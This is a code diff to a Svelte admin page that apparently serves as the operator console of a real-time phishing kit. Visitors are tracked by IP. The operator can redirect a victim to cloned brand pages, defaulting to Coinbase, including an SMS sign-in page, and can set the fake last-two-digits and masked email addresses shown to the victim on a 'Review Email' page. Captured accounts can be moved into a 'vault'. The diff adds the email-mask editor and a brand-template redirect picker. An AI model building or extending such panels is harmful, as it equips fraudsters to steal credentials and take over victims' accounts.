@@ -6,6 +6,7 @@
 		Eye,
 		ExternalLink,
 		Hash,
+		Mail,
 		Workflow,
 		Vault,
 		MessageSquare,
@@ -22,6 +23,7 @@
 	import SortableHeader from '$lib/components/SortableHeader.svelte';
 	import { timeAgo } from '$lib/utils/time';
 	import { MODULES } from '$lib/modules';
+	import { templates } from '$lib/templates';
 
 	let rows: Visitor[] = $state([]);
 	let total = $state(0);
@@ -35,7 +37,8 @@
 	let loading = $state(false);
 	let selected: Visitor | null = $state(null);
 	let last2Editor: { ip: string; value: string } | null = $state(null);
-	let redirectEditor: { ip: string; value: string } | null = $state(null);
+	let emailEditor: { ip: string; from: string; to: string } | null = $state(null);
+	let redirectEditor: { ip: string; template: string; module: string } | null = $state(null);
 	let confirmDelete: { ip: string; email: string } | null = $state(null);
 	let confirmVault: { ip: string; email: string } | null = $state(null);
 	let pollTimer: ReturnType<typeof setInterval> | null = null;
@@ -94,10 +97,13 @@
 		};
 	});
 
+	let selectedIp = $state<string | null>(null);
+
 	$effect(() => {
-		if (selected) {
-			const updated = $wsVisitors.find((v) => v.ip === selected!.ip);
+		if (selectedIp) {
+			const updated = $wsVisitors.find((v) => v.ip === selectedIp);
 			if (updated) selected = updated;
+			else { selected = null; selectedIp = null; }
 		}
 	});
 
@@ -111,8 +117,17 @@
 		}
 	}
 
+	function wsSend(type: Parameters<typeof sendMessage>[0], payload: unknown): boolean {
+		if (!sendMessage(type, payload)) {
+			toast.error('Not connected to server');
+			return false;
+		}
+		return true;
+	}
+
 	function toggleBypass(v: Visitor) {
-		sendMessage('visitor:bypass-flow', { ip: v.ip, bypassed: !v.flowBypassed });
+		if (!wsSend('visitor:bypass-flow', { ip: v.ip, bypassed: !v.flowBypassed })) return;
+		toast.success(v.flowBypassed ? 'Flow resumed' : 'Flow bypassed');
 	}
 
 	function promoteVault(v: Visitor) {
@@ -121,7 +136,7 @@
 
 	function performPromoteVault() {
 		if (!confirmVault) return;
-		sendMessage('visitor:promote-vault', { ip: confirmVault.ip });
+		if (!wsSend('visitor:promote-vault', { ip: confirmVault.ip })) return;
 		toast.success(`Moved ${confirmVault.email} to vault`);
 		confirmVault = null;
 	}
@@ -138,7 +153,7 @@
 	function performDelete() {
 		if (!confirmDelete) return;
 		const ip = confirmDelete.ip;
-		sendMessage('visitor:delete', { ip });
+		if (!wsSend('visitor:delete', { ip })) return;
 		rows = rows.filter((r) => r.ip !== ip);
 		toast.success(`Deleted session ${ip}`);
 		confirmDelete = null;
@@ -146,8 +161,12 @@
 
 	function handleEsc(e: KeyboardEvent) {
 		if (e.key !== 'Escape') return;
-		if (confirmDelete) confirmDelete = null;
+		if (redirectEditor) redirectEditor = null;
+		else if (last2Editor) last2Editor = null;
+		else if (emailEditor) emailEditor = null;
+		else if (confirmDelete) confirmDelete = null;
 		else if (confirmVault) confirmVault = null;
+		else if (selected) { selected = null; selectedIp = null; }
 	}
 
 	function openLast2(v: Visitor) {
@@ -156,17 +175,56 @@
 
 	function saveLast2() {
 		if (!last2Editor) return;
-		sendMessage('visitor:set-last-two', { ip: last2Editor.ip, digits: last2Editor.value });
+		if (!wsSend('visitor:set-last-two', { ip: last2Editor.ip, digits: last2Editor.value })) return;
+		toast.success('Last 2 digits updated');
 		last2Editor = null;
 	}
 
-	function openRedirect(v: Visitor) {
-		redirectEditor = { ip: v.ip, value: v.lastPageRoute || '' };
+	function openEmailEditor(v: Visitor) {
+		emailEditor = { ip: v.ip, from: v.emailFrom || '', to: v.emailTo || '' };
 	}
 
-	function saveRedirect() {
-		if (!redirectEditor || !redirectEditor.value.trim()) return;
-		sendMessage('visitor:redirect', { ip: redirectEditor.ip, template: redirectEditor.value.trim() });
+	function saveEmailMasks() {
+		if (!emailEditor) return;
+		if (!wsSend('visitor:set-email-masks', { ip: emailEditor.ip, emailFrom: emailEditor.from, emailTo: emailEditor.to })) return;
+		toast.success('Email masks updated');
+		emailEditor = null;
+	}
+
+	function brandsForRedirect(module: string): string[] {
+		const all = Object.keys(templates);
+		const key = (module || 'Coinbase').split(' ')[0];
+		const preferred = all.find((b) => b.toLowerCase() === key.toLowerCase() || module.toLowerCase().includes(b.toLowerCase()));
+		if (preferred) return [preferred, ...all.filter((b) => b !== preferred)];
+		return all;
+	}
+
+	function openRedirect(v: Visitor) {
+		redirectEditor = {
+			ip: v.ip,
+			template: v.lastPageRoute || '',
+			module: v.module || 'Coinbase'
+		};
+	}
+
+	async function saveRedirect() {
+		if (!redirectEditor || !redirectEditor.template) return;
+
+		const params = new URLSearchParams({
+			label: redirectEditor.template,
+			module: redirectEditor.module
+		});
+		const res = await fetch(`/api/visitor/resolve-path?${params}`);
+		if (res.ok) {
+			const data = await res.json();
+			if (!data.path) {
+				toast.error('This page is not available on visitor domains');
+				return;
+			}
+		}
+
+		if (!wsSend('visitor:redirect', { ip: redirectEditor.ip, template: redirectEditor.template })) return;
+		toast.success(`Redirecting to ${redirectEditor.template}`);
 		redirectEditor = null;
 	}
 
@@ -310,7 +368,7 @@
 						<!-- Actions -->
 						<div class="flex items-center gap-1 justify-end">
 							<button
-								onclick={() => (selected = v)}
+								onclick={() => { selected = v; selectedIp = v.ip; }}
 								class="flex items-center gap-1.5 rounded-lg border border-[var(--border)] px-2.5 py-1 text-[11px] text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)] hover:text-[var(--foreground)]"
 								title="View Details"
 							>
@@ -335,6 +393,15 @@
 								aria-label="Update Last 2 Digits"
 							>
 								<Hash size={13} />
+							</button>
+
+							<button
+								onclick={() => openEmailEditor(v)}
+								class="rounded-lg p-1.5 text-sky-400 transition-soft hover:bg-sky-400/10"
+								title="Edit Email Masks"
+								aria-label="Edit Email Masks"
+							>
+								<Mail size={13} />
 							</button>
 
 							<button
@@ -394,7 +461,7 @@
 </div>
 
 {#if selected}
-	<SessionDialog visitor={selected} onclose={() => (selected = null)} />
+	<SessionDialog visitor={selected} onclose={() => { selected = null; selectedIp = null; }} />
 {/if}
 
 {#if last2Editor}
@@ -418,20 +485,76 @@
 	</div>
 {/if}
 
-{#if redirectEditor}
-	<div class="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm" onclick={() => (redirectEditor = null)}>
-		<div class="w-full max-w-md rounded-xl border border-[var(--border)] bg-[var(--card)] p-5 shadow-2xl" onclick={(e) => e.stopPropagation()}>
-			<h3 class="text-sm font-semibold text-[var(--foreground)]">Redirect User</h3>
-			<p class="mt-1 text-xs text-[var(--muted-foreground)]">Send the visitor to a specific page.</p>
+{#if emailEditor}
+	<div class="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm" onclick={() => (emailEditor = null)}>
+		<div class="w-full max-w-sm rounded-xl border border-[var(--border)] bg-[var(--card)] p-5 shadow-2xl" onclick={(e) => e.stopPropagation()}>
+			<h3 class="text-sm font-semibold text-[var(--foreground)]">Edit Email Masks</h3>
+			<p class="mt-1 text-xs text-[var(--muted-foreground)]">Set the masked email addresses shown on the Review Email page.</p>
+			<label class="mt-4 block text-[10px] font-medium uppercase tracking-wider text-[var(--muted-foreground)]">From (current email)</label>
 			<input
 				type="text"
-				bind:value={redirectEditor.value}
-				class="mt-4 w-full rounded-lg border border-[var(--border)] bg-[var(--input)] px-3 py-2 font-mono text-xs text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none"
-				placeholder="signin/sms"
+				bind:value={emailEditor.from}
+				class="mt-1 w-full rounded-lg border border-[var(--border)] bg-[var(--input)] px-3 py-2 font-mono text-xs text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none"
+				placeholder="j•••••@gmail.com"
+			/>
+			<label class="mt-3 block text-[10px] font-medium uppercase tracking-wider text-[var(--muted-foreground)]">To (new email)</label>
+			<input
+				type="text"
+				bind:value={emailEditor.to}
+				class="mt-1 w-full rounded-lg border border-[var(--border)] bg-[var(--input)] px-3 py-2 font-mono text-xs text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none"
+				placeholder="a•••••s@protonmail.com"
 			/>
 			<div class="mt-5 flex justify-end gap-2">
+				<button onclick={() => (emailEditor = null)} class="rounded-lg border border-[var(--border)] px-3 py-1.5 text-xs text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)]">Cancel</button>
+				<button onclick={saveEmailMasks} class="rounded-lg bg-[var(--accent-primary)] px-3 py-1.5 text-xs text-white transition-soft hover:opacity-90">Save</button>
+			</div>
+		</div>
+	</div>
+{/if}
+
+{#if redirectEditor}
+	<div class="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm" onclick={() => (redirectEditor = null)}>
+		<div class="w-full max-w-lg rounded-xl border border-[var(--border)] bg-[var(--card)] p-5 shadow-2xl" onclick={(e) => e.stopPropagation()}>
+			<h3 class="text-sm font-semibold text-[var(--foreground)]">Redirect User</h3>
+			<p class="mt-1 text-xs text-[var(--muted-foreground)]">Select the page to send this visitor to.</p>
+			<label class="mt-4 block text-[10px] font-medium uppercase tracking-wider text-[var(--muted-foreground)]">Template Page</label>
+			<select
+				bind:value={redirectEditor.template}
+				class="mt-1 w-full rounded-lg border border-[var(--border)] bg-[var(--input)] px-3 py-2.5 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none"
+			>
+				<option value="">Select page...</option>
+				{#each brandsForRedirect(redirectEditor.module) as brand}
+					<optgroup label={brand}>
+						{#each Object.keys(templates[brand].routes) as page}
+							<option value="{brand}/{page}">{brand} — {page}</option>
+						{/each}
+					</optgroup>
+				{/each}
+			</select>
+			{#if redirectEditor.template}
+				<div class="mt-4 rounded-lg border border-[var(--border)] overflow-hidden">
+					<div class="border-b border-[var(--border)] bg-[var(--input)]/40 px-3 py-1.5 text-[10px] font-mono text-[var(--muted-foreground)]">
+						Preview: {redirectEditor.template}
+					</div>
+					<div class="h-48 bg-white">
+						<iframe
+							src="/templates/preview/{redirectEditor.template}"
+							title="Template preview"
+							class="h-full w-full border-0"
+							sandbox="allow-same-origin"
+						></iframe>
+					</div>
+				</div>
+			{/if}
+			<div class="mt-5 flex justify-end gap-2">
 				<button onclick={() => (redirectEditor = null)} class="rounded-lg border border-[var(--border)] px-3 py-1.5 text-xs text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)]">Cancel</button>
-				<button onclick={saveRedirect} class="rounded-lg bg-[var(--accent-primary)] px-3 py-1.5 text-xs text-white transition-soft hover:opacity-90">Redirect</button>
+				<button
+					onclick={saveRedirect}
+					disabled={!redirectEditor.template}
+					class="rounded-lg bg-[var(--accent-primary)] px-3 py-1.5 text-xs text-white transition-soft hover:opacity-90 disabled:opacity-50"
+				>
+					Redirect
+				</button>
 			</div>
 		</div>
 	</div>
